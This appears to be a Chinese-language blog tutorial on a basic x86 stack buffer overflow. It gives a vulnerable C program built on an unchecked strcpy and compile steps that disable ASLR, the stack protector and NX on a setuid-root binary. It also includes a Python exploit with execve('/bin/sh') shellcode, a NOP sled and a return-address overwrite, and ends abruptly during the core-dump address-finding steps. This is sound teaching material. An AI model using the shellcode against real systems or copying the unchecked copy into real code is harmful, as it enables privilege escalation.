---
title: easy x86 exploit
date: 2018-11-06 21:33:01
tags:
---

# x86 exploit
## basic vlun
### 最简单的栈溢出
#### 溢出
简单来说，就是输入的字符串长度超过了目标字符串长度限制，并且没有长度检测，导致了溢出。
#### 溢出类型
- 栈溢出(Stack Based Buffer Overflow)
- 堆溢出(Heap Based Buffer Overflow)

#### 栈溢出
漏洞代码
```
//vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
}
```
编译代码
```
echo 0 > /proc/sys/kernel/randomize_va_space
关闭aslr，地址空间布局随机化

gcc -g -fno-stack-protector -z execstack -o vuln vuln.c

-fno-stack-protector关闭堆栈保护
-z execstack 关闭NX（DEP）数据执行保护

sudo chown root vuln
sudo chgrp root vuln
sudo chmod +s vuln
```
然后通过返回地址覆盖的方法进行攻击。
exp.py
```
#!/usr/bin/env python
import struct
from subprocess import call

#Stack address where shellcode is copied.
ret_addr = 0xbffff5a0

#Spawn a shell
#execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#endianess convertion
def conv(num):
 return struct.pack("<I",num)
buf = "A" * 268
buf += conv(ret_addr)
buf += "\x90" * 100
buf += scode

print "Calling vulnerable program"
call(["./vuln", buf])
```
寻找返回地址，通过core文件
ulimit -c unlimited
sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
再次触发漏洞代码，会在tmp文件夹下面产生core文件，用gdb调试这个core文件，gdb vuln 

